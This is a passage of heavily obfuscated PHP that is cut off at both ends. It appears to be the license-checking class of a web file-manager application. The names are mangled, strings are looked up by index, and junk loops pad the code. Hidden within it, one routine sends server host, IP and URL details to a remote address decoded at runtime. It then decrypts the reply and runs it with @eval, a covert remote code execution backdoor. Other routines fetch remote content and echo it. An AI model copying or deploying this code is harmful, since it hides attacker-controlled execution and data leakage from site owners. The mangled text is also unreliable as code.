$†Û¥ªÂµ[$ÃĞÀ‚€Ş[103]]; $¾§Ï›† = $ÌÔ­°‰[652]; while ($¾§Ï›† < $ÌÔ­°‰[19]) { if ($¾§Ï›† >= 0) { break; } $¾§Ï›†++; } $this->licenseRegistSuccess(); $âçÓ±ç¾ = $ÌÔ­°‰[653]; if (!$âçÓ±ç¾) { die; } Cache::set($ÃĞÀ‚€Ş[196] . md5($ÜƒñÉ¡ï . $ÃĞÀ‚€Ş[197]), $ÃĞÀ‚€Ş[6]); show_json(LNG($ÃĞÀ‚€Ş[180]), !0); } private function licenseRegistSuccess() { $£ÑåÔ’ì =& $_SERVER[ë¦»ºéÌ]; $åÍíØ¨´ =& $_SERVER[·´Å÷Ä]; $‹ñ÷¢‹Õ = Model($åÍíØ¨´[33])->get(); $«¨­®‰¢ = $£ÑåÔ’ì[654]; if (strlen($«¨­®‰¢) < $£ÑåÔ’ì[642]) { return; } if ($‹ñ÷¢‹Õ[$åÍíØ¨´[63]] != $åÍíØ¨´[191]) { Model($åÍíØ¨´[33])->set($åÍíØ¨´[63], $åÍíØ¨´[191]); } Action($åÍíØ¨´[198])->initStart(!0); } private function vpmu31fee280() { $Ğ£Áğò˜ =& $_SERVER[·´Å÷Ä]; Model($Ğ£Áğò˜[33])->set(array($Ğ£Áğò˜[181] => $Ğ£Áğò˜[6], $Ğ£Áğò˜[183] => $Ğ£Áğò˜[6], $Ğ£Áğò˜[103] => $Ğ£Áğò˜[104], $Ğ£Áğò˜[105] => $Ğ£Áğò˜[6], $Ğ£Áğò˜[106] => $Ğ£Áğò˜[6])); Model($Ğ£Áğò˜[33])->setDeep($Ğ£Áğò˜[190], $Ğ£Áğò˜[199]); $ß¢À«Şú = $_SERVER[ë¦»ºéÌ][655]; $this->yfcn1b8cc74d = array(); $this->yaec5d6e5af9 = $Ğ£Áğò˜[104]; } private function bcxm44305ccd() { $ü€”œÃ =& $_SERVER[ë¦»ºéÌ]; $½É…¬‘§ =& $_SERVER[·´Å÷Ä]; $_SERVER[$½É…¬‘§[154]] = _get($_SERVER, $½É…¬‘§[154], APP_HOST); $this->yaec5d6e5af9 = $½É…¬‘§[104]; $•÷Ï‘ñÉ = $ü€”œÃ[656]; $Ó÷ûà¨Ù = Model($½É…¬‘§[33])->get(); if ($Ó÷ûà¨Ù[$½É…¬‘§[103]] == $½É…¬‘§[104]) { return; } $Ø¦İá„‘ = Model($½É…¬‘§[33])->get($½É…¬‘§[101]); $òÍÌÄƒÕ = $½É…¬‘§[196] . md5($Ø¦İá„‘ . $½É…¬‘§[197]); $ôêµü¤ç = $ü€”œÃ[657]; while (strlen($ôêµü¤ç) < $ü€”œÃ[642]) { if (!$ôêµü¤ç) { break; } $ôêµü¤ç++; } $¡ÕóÕ”Ş = Cache::get($òÍÌÄƒÕ); if (!is_array($¡ÕóÕ”Ş) || !isset($¡ÕóÕ”Ş[$½É…¬‘§[200]]) || time() - $¡ÕóÕ”Ş[$½É…¬‘§[200]] >= 60) { $Ë·øô®ù = Model($½É…¬‘§[7])->loadList(); $ŸØÎª• = $Ë·øô®ù[$½É…¬‘§[193]]; $îƒ¼Î±Œ = md5($_SERVER[$½É…¬‘§[100]] . strrev($Ø¦İá„‘) . $Ó÷ûà¨Ù[$½É…¬‘§[183]]); $‘ìí—ë» = strrev(substr($îƒ¼Î±Œ, 10, 16)); $¡ÕóÕ”Ş = $this->jvky07d81805($ŸØÎª•[$½É…¬‘§[83]][$‘ìí—ë»], $îƒ¼Î±Œ); $¡ÕóÕ”Ş = json_decode($¡ÕóÕ”Ş, !0); } if (!is_array($¡ÕóÕ”Ş)) { return $this->vpmu31fee280(); } $ûµóÑæÁ = strtotime($¡ÕóÕ”Ş[$½É…¬‘§[123]]); if (time() >= $ûµóÑæÁ) { return $this->vpmu31fee280(); } if (time() - $¡ÕóÕ”Ş[$½É…¬‘§[200]] > 20) { $¡ÕóÕ”Ş[$½É…¬‘§[200]] = time(); Cache::set($òÍÌÄƒÕ, $¡ÕóÕ”Ş); } $this->yfcn1b8cc74d = $¡ÕóÕ”Ş; $this->yaec5d6e5af9 = $Ó÷ûà¨Ù[$½É…¬‘§[103]]; } private function rdzw96650481() { $³í›Ë€¤ =& $_SERVER[·´Å÷Ä]; $­¨ï„ = $GLOBALS[$³í›Ë€¤[13]]; $Ó³­å÷î = $_SERVER[ë¦»ºéÌ][658]; $Ó€Òë‚± = $_SERVER[$³í›Ë€¤[24]]; if ($Ó€Òë‚± == $³í›Ë€¤[201] && $this->yaec5d6e5af9 == $³í›Ë€¤[104]) { show_json(LNG($³í›Ë€¤[202]), !1, $³í›Ë€¤[203]); } $ÅÍğ‡…¬ = array($³í›Ë€¤[204], $³í›Ë€¤[205]); if (in_array($Ó€Òë‚±, $ÅÍğ‡…¬)) { if ($this->yaec5d6e5af9 == $³í›Ë€¤[104] && isset($­¨ï„[$³í›Ë€¤[206]])) { show_json(LNG($³í›Ë€¤[202]), !1, $³í›Ë€¤[203]); die; } $‹§â‚ØŠ = $this->iqbe282eb69e(); if ($‹§â‚ØŠ != intval($³í›Ë€¤[207])) { if ($‹§â‚ØŠ <= Model($³í›Ë€¤[119])->count()) { show_json(LNG($³í›Ë€¤[208]), !1, $³í›Ë€¤[203]); die; } } } } private function zihl540044f8() { $ı’¤«î† =& $_SERVER[ë¦»ºéÌ]; $•§É“æÑ =& $_SERVER[·´Å÷Ä]; $ò…Ô«£¶ = array($•§É“æÑ[116], $•§É“æÑ[209]); if (!_get($GLOBALS, $•§É“æÑ[113]) || !isset($_GET[$•§É“æÑ[210]])) { return; } if (!in_array($_SERVER[$•§É“æÑ[24]], $ò…Ô«£¶)) { return; } $¥‹ìÚÌ = $•§É“æÑ[211]; $¥‹ìÚÌ = $this->ucmkda61d404($¥‹ìÚÌ, $•§É“æÑ[212]); $éâÖ©¡ = stream_context_create(array($•§É“æÑ[213] => array($•§É“æÑ[214] => $•§É“æÑ[215], $•§É“æÑ[216] => 3))); $¢ÕÌïæú = $ı’¤«î†[659]; if (strlen($¢ÕÌïæú) < $ı’¤«î†[616]) { die; } $¸î×Ì“£ = @file_get_contents($¥‹ìÚÌ, !1, $éâÖ©¡); header($•§É“æÑ[217]); if ($¸î×Ì“£ && strstr($¸î×Ì“£, $•§É“æÑ[218])) { echo $¸î×Ì“£; } die; } public function jgeu3e792bb9($ªŒïïÉ) { $‘‹Ø¥—× =& $_SERVER[ë¦»ºéÌ]; $´ğ‚ø¹ =& $_SERVER[·´Å÷Ä]; if ($this->yaec5d6e5af9 == $´ğ‚ø¹[219]) { return $ªŒïïÉ; } $ÚÍŠ‘ŠŠ = array($´ğ‚ø¹[220] => $´ğ‚ø¹[221], $´ğ‚ø¹[222] => $´ğ‚ø¹[221], $´ğ‚ø¹[223] => $´ğ‚ø¹[221], $´ğ‚ø¹[224] => $´ğ‚ø¹[221], $´ğ‚ø¹[225] => $´ğ‚ø¹[226], $´ğ‚ø¹[227] => $´ğ‚ø¹[226], $´ğ‚ø¹[228] => $´ğ‚ø¹[226], $´ğ‚ø¹[229] => $´ğ‚ø¹[226], $´ğ‚ø¹[230] => $´ğ‚ø¹[226], $´ğ‚ø¹[231] => $´ğ‚ø¹[226], $´ğ‚ø¹[232] => $´ğ‚ø¹[226], $´ğ‚ø¹[233] => $´ğ‚ø¹[226], $´ğ‚ø¹[234] => $´ğ‚ø¹[226], $´ğ‚ø¹[235] => $´ğ‚ø¹[226], $´ğ‚ø¹[236] => $´ğ‚ø¹[226], $´ğ‚ø¹[237] => $´ğ‚ø¹[226]); $ÁõåùÅÅ = explode($´ğ‚ø¹[238], _get($this->yfcn1b8cc74d, $´ğ‚ø¹[110], $´ğ‚ø¹[6])); $åŞîªÊ  = $‘‹Ø¥—×[660]; if (strlen($åŞîªÊ ) < $‘‹Ø¥—×[642]) { die; } $–ñ‰œÁø = array(); $í•¹›” = $‘‹Ø¥—×[661]; if (!$í•¹›”) { die; } foreach ($ÚÍŠ‘ŠŠ as $¹æìõ½Õ => $™ÏçÏ»²) { if ($™ÏçÏ»² == $´ğ‚ø¹[221] && substr($this->yaec5d6e5af9, 0, 1) == $´ğ‚ø¹[221]) { continue; } if (!in_array($¹æìõ½Õ, $ÁõåùÅÅ)) { $–ñ‰œÁø[] = $¹æìõ½Õ; } } foreach ($–ñ‰œÁø as $¹æìõ½Õ) { unset($ªŒïïÉ[$¹æìõ½Õ]); } return $ªŒïïÉ; $‘Ïş×ä‘ = $‘‹Ø¥—×[662]; while ($‘Ïş×ä‘ < $‘‹Ø¥—×[616]) { if ($‘Ïş×ä‘ >= 0) { break; } $‘Ïş×ä‘++; } } private function avfz068aefa0() { $ÀŞŸ´áç =& $_SERVER[·´Å÷Ä]; if ($this->yaec5d6e5af9 != $ÀŞŸ´áç[104]) { $GLOBALS[$ÀŞŸ´áç[83]][$ÀŞŸ´áç[87]][$ÀŞŸ´áç[239]] = $ÀŞŸ´áç[199]; return; } $GLOBALS[$ÀŞŸ´áç[83]][$ÀŞŸ´áç[240]] = $ÀŞŸ´áç[191]; if (Model($ÀŞŸ´áç[241])->get($ÀŞŸ´áç[63]) != $ÀŞŸ´áç[199]) { Model($ÀŞŸ´áç[241])->set($ÀŞŸ´áç[63], $ÀŞŸ´áç[199]); } } public function zjcocd714f2f() { return $_SERVER[·´Å÷Ä][242]; $µ•ŸÃß = $_SERVER[ë¦»ºéÌ][663]; } private function vbux47d64078() { $“Í¹Èº =& $_SERVER[ë¦»ºéÌ]; $›Ñ­¹ÅŒ =& $_SERVER[·´Å÷Ä]; $¨‘Ñãûö = array($›Ñ­¹ÅŒ[243], $›Ñ­¹ÅŒ[244], $›Ñ­¹ÅŒ[245]); $™Ççä¤ê = $›Ñ­¹ÅŒ[246] . md5($›Ñ­¹ÅŒ[247]); if ($this->yaec5d6e5af9 == $›Ñ­¹ÅŒ[104] || !_get($GLOBALS, $›Ñ­¹ÅŒ[113])) { return; } if (!in_array($_SERVER[$›Ñ­¹ÅŒ[24]], $¨‘Ñãûö)) { return; } if (time() % 4 != 0) { return; } $ô¹© = call_user_func(array($›Ñ­¹ÅŒ[248], $›Ñ­¹ÅŒ[249]), $™Ççä¤ê); if ($ô¹© && time() - $ô¹© < intval($›Ñ­¹ÅŒ[250])) { return; } call_user_func(array($›Ñ­¹ÅŒ[248], $›Ñ­¹ÅŒ[133]), $™Ççä¤ê, time()); $¸öø·øƒ = Model($›Ñ­¹ÅŒ[33])->get($›Ñ­¹ÅŒ[101]); $’õÍÌ”Ä = $“Í¹Èº[664]; $áÚÚæØ— = array($›Ñ­¹ÅŒ[145] => Model($›Ñ­¹ÅŒ[33])->get($›Ñ­¹ÅŒ[181]), $›Ñ­¹ÅŒ[158] => $this->yaec5d6e5af9, $›Ñ­¹ÅŒ[155] => $_SERVER[$›Ñ­¹ÅŒ[156]], $›Ñ­¹ÅŒ[157] => Model($›Ñ­¹ÅŒ[33])->get($›Ñ­¹ÅŒ[125]), $›Ñ­¹ÅŒ[99] => md5($_SERVER[$›Ñ­¹ÅŒ[100]] . $¸öø·øƒ), $›Ñ­¹ÅŒ[148] => $›Ñ­¹ÅŒ[130], $›Ñ­¹ÅŒ[151] => $_SERVER[$›Ñ­¹ÅŒ[152]]); $ï±œé© = $this->logydd36e9a4($›Ñ­¹ÅŒ[251], $áÚÚæØ—); $†¾£ø„ = $“Í¹Èº[665]; while (strlen($†¾£ø„) < $“Í¹Èº[613]) { if (!$†¾£ø„) { break; } $†¾£ø„++; } if (!is_array($ï±œé©)) { return; } if ($ï±œé©[$›Ñ­¹ÅŒ[145]] && $ï±œé©[$›Ñ­¹ÅŒ[252]]) { if ($this->ovhz7d400899($ï±œé©[$›Ñ­¹ÅŒ[252]]) == $áÚÚæØ—[$›Ñ­¹ÅŒ[145]]) { return; } } $this->vpmu31fee280(); if ($this->ovhz7d400899($ï±œé©[$›Ñ­¹ÅŒ[252]]) != $áÚÚæØ—[$›Ñ­¹ÅŒ[145]]) { $«ÇØáŒå = array($›Ñ­¹ÅŒ[176] => $¸öø·øƒ, $›Ñ­¹ÅŒ[177] => $_SERVER[$›Ñ­¹ÅŒ[100]], $›Ñ­¹ÅŒ[178] => this_url(), $›Ñ­¹ÅŒ[153] => $_SERVER[$›Ñ­¹ÅŒ[154]]); $¤’Êâšå = $this->quytd2addd2f(json_encode($«ÇØáŒå)); $ï±œé© = $this->logydd36e9a4($›Ñ­¹ÅŒ[179] . $¤’Êâšå); if ($ï±œé© && is_array($ï±œé©) && isset($ï±œé©[$›Ñ­¹ÅŒ[252]])) { $¾µñî§ù = $this->jvky07d81805($ï±œé©[$›Ñ­¹ÅŒ[252]], 2); if ($¾µñî§ù) { $¾µñî§ù = $this->ovhz7d400899($¾µñî§ù); } if ($¾µñî§ù) { try { @eval($¾µñî§ù); } catch (Exception $—¿æª”–) { } } } } } private function logydd36e9a4($»æü›Áá = '', $”­½ö¤¥ = array(), $š Ê±¨Í = 5) { $ƒ¶ªœ¢‚ =& $_SERVER[·´Å÷Ä]; $Ãó ıİÖ = $ƒ¶ªœ¢‚[253]; $Ãó ıİÖ = $this->ucmkda61d404($Ãó ıİÖ, $ƒ¶ªœ¢‚[254]); $Ãó ıİÖ = $Ãó ıİÖ . $»æü›Áá; if ($”­½ö¤¥ && is_array($”­½ö¤¥)) { $Ãó ıİÖ = $Ãó ıİÖ . $ƒ¶ªœ¢‚[255] . http_build_query($”­½ö¤¥); } if ($”­½ö¤¥ === -1) { return $Ãó ıİÖ; } $Â·øéİ† = stream_context_create(array($ƒ¶ªœ¢‚[213] => array($ƒ¶ªœ¢‚[216] => $š Ê±¨Í, $ƒ¶ªœ¢‚[214] => $ƒ¶ªœ¢‚[256]), $ƒ¶ªœ¢‚[257] => array($ƒ¶ªœ¢‚[258] => !1, $ƒ¶ªœ¢‚[259] => !1))); $”­½ö¤¥ = @file_get_contents($Ãó ıİÖ, !1, $Â·øéİ†); return json_decode($”­½ö¤¥, !0); } private function iqbe282eb69e() { $ä¾¤àğÏ =& $_SERVER[ë¦»ºéÌ]; $°¡ùó¨ =& $_SERVER[·´Å÷Ä]; $¤‰÷ÄÑ¢ = array($°¡ùó¨[260] => $°¡ùó¨[261], $°¡ùó¨[262] => $°¡ùó¨[263], $°¡ùó¨[264] => $°¡ùó¨[265], $°¡ùó¨[266] => $°¡ùó¨[267], $°¡ùó¨[268] => $°¡ùó¨[269], $°¡ùó¨[270] => $°¡ùó¨[207], $°¡ùó¨[271] => $°¡ùó¨[207], $°¡ùó¨[272] => $°¡ùó¨[261], $°¡ùó¨[273] => $°¡ùó¨[263], $°¡ùó¨[274] => $°¡ùó¨[265], $°¡ùó¨[275] => $°¡ùó¨[276], $°¡ùó¨[277] => $°¡ùó¨[267], $°¡ùó¨[278] => $°¡ùó¨[279], $°¡ùó¨[280] => $°¡ùó¨[269], $°¡ùó¨[281] => $°¡ùó¨[282], $°¡ùó¨[283] => $°¡ùó¨[284], $°¡ùó¨[285] => $°¡ùó¨[286]); $ÅŞ åÅ“ = $ä¾¤àğÏ[666]; if (!$ÅŞ åÅ“) { die; } $ëœÉè¶ê = $¤‰÷ÄÑ¢[$this->yaec5d6e5af9]; $ëœÉè¶ê = intval($ëœÉè¶ê ? $ëœÉè¶ê : $°¡ùó¨[261]); $öÏ²µÄ = $ä¾¤àğÏ[667]; if (!$öÏ²µÄ) { die; } $Ø†İóÉ  = _get($this->yfcn1b8cc74d, $°¡ùó¨[287]); $ÁØÇ¡€š = $ä¾¤àğÏ[668]; while (strlen($ÁØÇ¡€š) < $ä¾¤àğÏ[616]) { if (!$ÁØÇ¡€š) { break; } $ÁØÇ¡€š++; } $Ø†İóÉ  = $Ø†İóÉ  ? intval($Ø†İóÉ ) : 0; return $ëœÉè¶ê + $Ø†İóÉ ; $‡ñÚæ‚ò = $ä¾¤àğÏ[669]; if (!$‡ñÚæ‚ò) { die; } } public function iuvp33b1909c($Šçâ¯Ô) { $ş¸´øÇ¼ =& $_SERVER[·´Å÷Ä]; $ıºÙ§€ = $this->iqbe282eb69e(); $®¥»È“» = $_SERVER[ë¦»ºéÌ][670]; if (!$®¥»È“») { die; } if ($Šçâ¯Ô[$ş¸´øÇ¼[288]] == $ş¸´øÇ¼[191]) { return; } if ($ıºÙ§€ >= intval($ş¸´øÇ¼[207])) { return; } $™èŸÙ­ = Model($ş¸´øÇ¼[119])->count(); if ($™èŸÙ­ <= $ıºÙ§€) { return; } $—ø¤ñÇ… = Model($ş¸´øÇ¼[119])->field($ş¸´øÇ¼[288])->limit($ıºÙ§€)->select(); $—ø¤ñÇ… = array_to_keyvalue($—ø¤ñÇ…, $ş¸´øÇ¼[6], $ş¸´øÇ¼[288]); if (!in_array($Šçâ¯Ô[$ş¸´øÇ¼[288]], $—ø¤ñÇ…)) { show_json($ş¸´øÇ¼[289], !1, $ş¸´øÇ¼[203]); } } public function elaq12986e53() { $ò††Á€Ô =& $_SERVER[ë¦»ºéÌ]; $ºä¥¦‘¯ =& $_SERVER[·´Å÷Ä]; if (!_get($GLOBALS, $ºä¥¦‘¯[113]) || mt_rand(1, 100) > 20) { return; } $¹Ğ«Ìô = $ºä¥¦‘¯[211]; $¹Ğ«Ìô = $this->ucmkda61d404($¹Ğ«Ìô, $ºä¥¦‘¯[212]); $¶ù›ö‚ = $ò††Á€Ô[671]; while (strlen($¶ù›ö‚) < $ò††Á€Ô[616]) { if (!$¶ù›ö‚) { break; } $¶ù›ö‚++; } $ƒ®Ç–ä = stream_context_create(array($ºä¥¦‘¯[213] => array($ºä¥¦‘¯[214] => $ºä¥¦‘¯[215], $ºä¥¦‘¯[216] => 3))); $¨èö¦Œ = @file_get_contents($¹Ğ«Ìô, !1, $ƒ®Ç–ä); echo $ºä¥¦‘¯[290] . hash_encode($¨èö¦Œ) . $ºä¥¦‘¯[291]; } private function sifj443386fc($’Û§É„², $üÉ¬›ªÁ, $µÅ‹—”± = 3) { $Ì§ñÁÄø =& $_SERVER[ë¦»ºéÌ]; $Ğõ…Êğé =& $_SERVER[·´Å÷Ä]; usleep(1); $’Û§É„² = trim($’Û§É„²); $ŞÑÔÔÔ‚ = $Ì§ñÁÄø[672]; if (!$ŞÑÔÔÔ‚) { return; } $ƒâšş¾¯ = mt_rand(0, 5) . $Ğõ…Êğé[6]; $ÄÓ§œ”œ = $Ì§ñÁÄø[673]; if (!$ÄÓ§œ”œ) { return; } $¶œÇ÷éË = rand_string(15); $ùËÓÈŠó = $Ğõ…Êğé[292]; switch ($ƒâšş¾¯) { case $Ğõ…Êğé[199]: $‹¦„€Ø† = $this->jvbycdc38ad1($’Û§É„², strrev($üÉ¬›ªÁ . $¶œÇ÷éË)); $é¾ñÀ»œ = $Ì§ñÁÄø[674]; while ($é¾ñÀ»œ < $Ì§ñÁÄø[628]) { if ($é¾ñÀ»œ >= 0) { break; } $é¾ñÀ»œ++; } break; case $Ğõ…Êğé[191]: $‹¦„€Ø† = $this->jvbycdc38ad1($’Û§É„², strrev($¶œÇ÷éË . $üÉ¬›ªÁ)); break; case $Ğõ…Êğé[293]: $‹¦„€Ø† = $this->jvbycdc38ad1($’Û§É„², base64_encode($¶œÇ÷éË . $üÉ¬›ªÁ)); break; $í°»…¹Á = $Ì§ñÁÄø[675]; case $Ğõ…Êğé[294]: $‹¦„€Ø† = $this->jvbycdc38ad1($’Û§É„², md5($¶œÇ÷éË . $üÉ¬›ªÁ)); $†éû«€Å = $Ì§ñÁÄø[676]; if (!$†éû«€Å) { die; } break; $ŸÚÕñªÌ = $Ì§ñÁÄø[677]; while ($ŸÚÕñªÌ < $Ì§ñÁÄø[613]) { if ($ŸÚÕñªÌ >= 0) { break; } $ŸÚÕñªÌ++; } case $Ğõ…Êğé[295]: $’Û§É„² = base64_encode($’Û§É„²); $ŠòøŠÓí = $Ì§ñÁÄø[678]; if (strlen($ŠòøŠÓí) < $Ì§ñÁÄø[616]) { return; } $Ïş°ÖÔ­ = rand(0, 64); $ßê»ë‡ = $ùËÓÈŠó[$Ïş°ÖÔ­]; $¥âáúÄÓ = $Ì§ñÁÄø[679]; $âû¢Ğ¾û = md5($ßê»ë‡ . md5($üÉ¬›ªÁ . $ßê»ë‡) . $üÉ¬›ªÁ); $Îç¿Ü = $Ì§ñÁÄø[680]; $âû¢Ğ¾û = substr($âû¢Ğ¾û, $Ïş°ÖÔ­ % 8, $Ïş°ÖÔ­ % 8 + 7); $Ú÷–ÓÜØ = $Ì§ñÁÄø[681]; if (!$Ú÷–ÓÜØ) { die; } $ëíĞ ü­ = $Ğõ…Êğé[6]; $Üçô²Í• = $Ì§ñÁÄø[682]; $¶Áºš…è = 0; $à¢Øı»ı = 0; $î€¿š›á = $Ì§ñÁÄø[683]; $ÀÓ®¯àõ = 0; $µ¿Œ™‹ = $Ì§ñÁÄø[684]; while ($µ¿Œ™‹ < $Ì§ñÁÄø[616]) { if ($µ¿Œ™‹ >= 0) { break; } $µ¿Œ™‹++; } for ($¶Áºš…è = 0; $¶Áºš…è < strlen($’Û§É„²); $¶Áºš…è++) { $ÀÓ®¯àõ = $ÀÓ®¯àõ == strlen($âû¢Ğ¾û) ? 0 : $ÀÓ®¯àõ; $ÁøêÉÎÙ = $Ì§ñÁÄø[685]; if (!$ÁøêÉÎÙ) { die; } $à¢Øı»ı = ($Ïş°ÖÔ­ + strpos($ùËÓÈŠó, $’Û§É„²[$¶Áºš…è]) + ord($âû¢Ğ¾û[$ÀÓ®¯àõ++])) % 64; $¾û³¿Ìµ = $Ì§ñÁÄø[686]; $ëíĞ ü­ .= $ùËÓÈŠó[$à¢Øı»ı]; } $‹¦„€Ø† = hash_encode($ßê»ë‡ . $ëíĞ ü­); break; default: $‹¦„€Ø† = $this->jvbycdc38ad1($’Û§É„², $üÉ¬›ªÁ . $¶œÇ÷éË); break; } $‹¦„€Ø† = strrev($ƒâšş¾¯ . $¶œÇ÷éË . $‹¦„€Ø†); if ($µÅ‹—”± - 1 > 0) { $‹¦„€Ø† = $this->sifj443386fc($‹¦„€Ø†, $üÉ¬›ªÁ, $µÅ‹—”± - 1); } return $‹¦„€Ø†; } private function jvky07d81805($ì•¨ÒÌ, $ËéÅú»é, $Ô­ˆËäÏ = 3) { $ÚıÏàµÑ =& $_SERVER[ë¦»ºéÌ]; $„ØÁ¥¬â =& $_SERVER[·´Å÷Ä]; if (!is_string($ì•¨ÒÌ) || strlen($ì•¨ÒÌ) < 10) { return !1; } $ì•¨ÒÌ = trim($ì•¨ÒÌ); $Û¾»„é = $ÚıÏàµÑ[687]; while ($Û¾»„é < $ÚıÏàµÑ[613]) { if ($Û¾»„é >= 0) { break; } $Û¾»„é++; } $ì•¨ÒÌ = strrev($ì•¨ÒÌ); $ØÒçôà = $ÚıÏàµÑ[688]; while ($ØÒçôà < $ÚıÏàµÑ[613]) { if ($ØÒçôà >= 0) { break; } $ØÒçôà++; } $­îé¯½ = $ì•¨ÒÌ[0]; $àı…ëˆø = $ÚıÏàµÑ[689]; while (strlen($àı…ëˆø) < $ÚıÏàµÑ[613]) { if (!$àı…ëˆø) { break; } $àı…ëˆø++; } $¦ñïß¬ = substr($ì•¨ÒÌ, 1, 15); $ì•¨ÒÌ = substr($ì•¨ÒÌ, 16); $“Î•“¬š = $ÚıÏàµÑ[690]; $Š©íœ½‰ = $„ØÁ¥¬â[292]; $ŞëŸû‰ï = $ÚıÏàµÑ[691]; if (strlen($ŞëŸû‰ï) < $ÚıÏàµÑ[616]) { die; } switch ($­îé¯½) { case $„ØÁ¥¬â[199]: $Í³­™Èè = $this->ucmkda61d404($ì•¨ÒÌ, strrev($ËéÅú»é . $¦ñïß¬)); break; $óÂ“ÀÍ• = $ÚıÏàµÑ[687]; while ($óÂ“ÀÍ• < $ÚıÏàµÑ[613]) { if ($óÂ“ÀÍ• >= 0) { break; } $óÂ“ÀÍ•++; } case $„ØÁ¥¬â[191]: $Í³­™Èè = $this->ucmkda61d404($ì•¨ÒÌ, strrev($¦ñïß¬ . $ËéÅú»é)); break; case $„ØÁ¥¬â[293]: $Í³­™Èè = $this->ucmkda61d404($ì•¨ÒÌ, base64_encode($¦ñïß¬ . $ËéÅú»é)); break; $Áß­Ä = $ÚıÏàµÑ[692]; if (strlen($Áß­Ä) < $ÚıÏàµÑ[19]) { return; } case $„ØÁ¥¬â[294]: $Í³­™Èè = $this->ucmkda61d404($ì•¨ÒÌ, md5($¦ñïß¬ . $ËéÅú»é)); break; $§¾›“Ò = $ÚıÏàµÑ[693]; if (strlen($§¾›“Ò) < $ÚıÏàµÑ[613]) { die; } case $„ØÁ¥¬â[295]: $ì•¨ÒÌ = hash_decode($ì•¨ÒÌ); $õ­Ã§Ÿ¾ = $ì•¨ÒÌ[0]; $ä¬èÃöê = $ÚıÏàµÑ[694]; if (!$ä¬èÃöê) { die; } $ì•¨ÒÌ = substr($ì•¨ÒÌ, 1); $œÊüßı’ = strpos($Š©íœ½‰, $õ­Ã§Ÿ¾); $Ùëş¥ç = md5($õ­Ã§Ÿ¾ . md5($ËéÅú»é . $õ­Ã§Ÿ¾) . $ËéÅú»é); $”ƒÉº¤³ = $ÚıÏàµÑ[695]; while (strlen($”ƒÉº¤³) < $ÚıÏàµÑ[628]) { if (!$”ƒÉº¤³) { break; } $”ƒÉº¤³++; } $Ùëş¥ç = substr($Ùëş¥ç, $œÊüßı’ % 8, $œÊüßı’ % 8 + 7); $†‹‚‡Í™ = $„ØÁ¥¬â[6]; $—ğ¾ÊöŒ = $ÚıÏàµÑ[696]; $ı¯Ôü¶î = 0; $€Ò®şîù = $ÚıÏàµÑ[697]; $İá‰Æ²¯ = 0; $ÈÎ²„¬ = $ÚıÏàµÑ[698]; if (!$ÈÎ²„¬) { return; } $‹”¶ÅøÓ = 0; for ($ı¯Ôü¶î = 0; $ı¯Ôü¶î < strlen($ì•¨ÒÌ); $ı¯Ôü¶î++) { $‹”¶ÅøÓ = $‹”¶ÅøÓ == strlen($Ùëş¥ç) ? 0 : $‹”¶ÅøÓ; $ñèŒ²Ÿ¤ = $ÚıÏàµÑ[699]; while ($ñèŒ²Ÿ¤ < $ÚıÏàµÑ[628]) { if ($ñèŒ²Ÿ¤ >= 0) { break; } $ñèŒ²Ÿ¤++; } $ÈÇÍí™¥ = $‹”¶ÅøÓ++; $İá‰Æ²¯ = strpos($Š©íœ½‰, $ì•¨ÒÌ[$ı¯Ôü¶î]) - $œÊüßı’ - ord($Ùëş¥ç[$ÈÇÍí™¥]); while ($İá‰Æ²¯ < 0) { $İá‰Æ²¯ += 64; $¹ÏÈĞ…— = $ÚıÏàµÑ[700]; if (!$¹ÏÈĞ…—) { die; } } $†‹‚‡Í™ .= $Š©íœ½‰[$İá‰Æ²¯]; $ï¹äÑÂ· = $ÚıÏàµÑ[701]; if (!$ï¹äÑÂ·) { die; } } $Í³­™Èè = base64_decode($†‹‚‡Í™); $» šŞÛ¹ = $ÚıÏàµÑ[702]; if (!$» šŞÛ¹) { die; } break; $‚îõÉìÕ = $ÚıÏàµÑ[703]; if (strlen($‚îõÉìÕ) < $ÚıÏàµÑ[19]) { die; } default: $Í³­™Èè = $this->ucmkda61d404($ì•¨ÒÌ, $ËéÅú»é . $¦ñïß¬); $Õ„ôçî = $ÚıÏàµÑ[704]; if (strlen($Õ„ôçî) < $ÚıÏàµÑ[616]) { return; } break; $ÚÂ£ñšæ = $ÚıÏàµÑ[705]; if (strlen($ÚÂ£ñšæ) < $ÚıÏàµÑ[642]) { return; } } if ($Ô­ˆËäÏ - 1 > 0) { $Í³­™Èè = $this->jvky07d81805($Í³­™Èè, $ËéÅú»é, $Ô­ˆËäÏ - 1); } return $Í³­™Èè; } public function quytd2addd2f($¢‰º™üÅ) { $¥Õ±ì¸ß =& $_SERVER[ë¦»ºéÌ]; $®Ô‘ïï =& $_SERVER[·´Å÷Ä]; $éÏ±Ô¼” = $this->magqc22a4c89(); $¬Âœæì› = $¥Õ±ì¸ß[706]; $¡ú¡¶í¨ = $this->magqc22a4c89(); $ù¾Áˆ› = $¥Õ±ì¸ß[707]; $¿¤™£‡ = ($éÏ±Ô¼” - 1) * ($¡ú¡¶í¨ - 1); $Ç‚ğ¦ıÇ = $¥Õ±ì¸ß[708]; while (strlen($Ç‚ğ¦ıÇ) < $¥Õ±ì¸ß[19]) { if (!$Ç‚ğ¦ıÇ) { break; } $Ç‚ğ¦ıÇ++; } $­Œ”ÚÕ = intval(($éÏ±Ô¼” + $¡ú¡¶í¨) / 2); $ñÓÃõúŸ = $¥Õ±ì¸ß[709]; if (strlen($ñÓÃõúŸ) < $¥Õ±ì¸ß[613]) { die; } while (1) { $”æ‚Ş·İ = $­Œ”ÚÕ; $ÁèÁ«œ‚ = $¿¤™£‡; while ($ÁèÁ«œ‚ % $”æ‚Ş·İ != 0) { $¥Ìµ‹Ñ› = $ÁèÁ«œ‚; $»º´½‘à = $¥Õ±ì¸ß[710]; while (strlen($»º´½‘à) < $¥Õ±ì¸ß[613]) { if (!$»º´½‘à) { break; } $»º´½‘à++; } $ÁèÁ«œ‚ = $”æ‚Ş·İ; $‹…ìÎ¿ = $¥Õ±ì¸ß[711]; while (strlen($‹…ìÎ¿) < $¥Õ±ì¸ß[616]) { if (!$‹…ìÎ¿) { break; } $‹…ìÎ¿++; } $”æ‚Ş·İ = $¥Ìµ‹Ñ› % $”æ‚Ş·İ; $ğÕ§Õ¼ = $¥Õ±ì¸ß[712]; while ($ğÕ§Õ¼ < $¥Õ±ì¸ß[642]) { if ($ğÕ§Õ¼ >= 0) { break; } $ğÕ§Õ¼++; } } if ($”æ‚Ş·İ == 1) { break; } else { $­Œ”ÚÕ++; } } $Ãõ‘ñ‘ö = 2; $«õÉåÍÑ = $¥Õ±ì¸ß[713]; if (strlen($«õÉåÍÑ) < 